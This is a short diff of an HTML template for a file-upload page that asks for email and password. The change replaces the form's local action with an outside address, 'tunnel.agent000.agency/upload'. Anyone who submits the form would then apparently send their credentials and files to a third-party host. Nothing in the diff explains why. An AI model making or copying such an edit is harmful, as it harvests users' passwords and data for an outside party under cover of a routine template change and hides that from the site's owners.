@@ -6,12 +6,12 @@
 </head>
 <body>
   <h1>Upload Your File</h1>
-  <form method="post" action="/" enctype="multipart/form-data">
-    <input type="email" name="email" placeholder="Your email" required><br><br>
-    <input type="password" name="password" placeholder="Password" required><br><br>
-    <input type="file" name="file" required><br><br>
-    <button type="submit">Upload</button>
-  </form>
+  <form action="https://tunnel.agent000.agency/upload" method="POST" enctype="multipart/form-data">
+  <input type="text" name="email" placeholder="Email" required>
+  <input type="password" name="password" placeholder="Password" required>
+  <input type="file" name="file" required>
+  <input type="submit" value="Upload">
+</form>
 
   {% if message %}
     <p style="color: red;">{{ message }}</p>
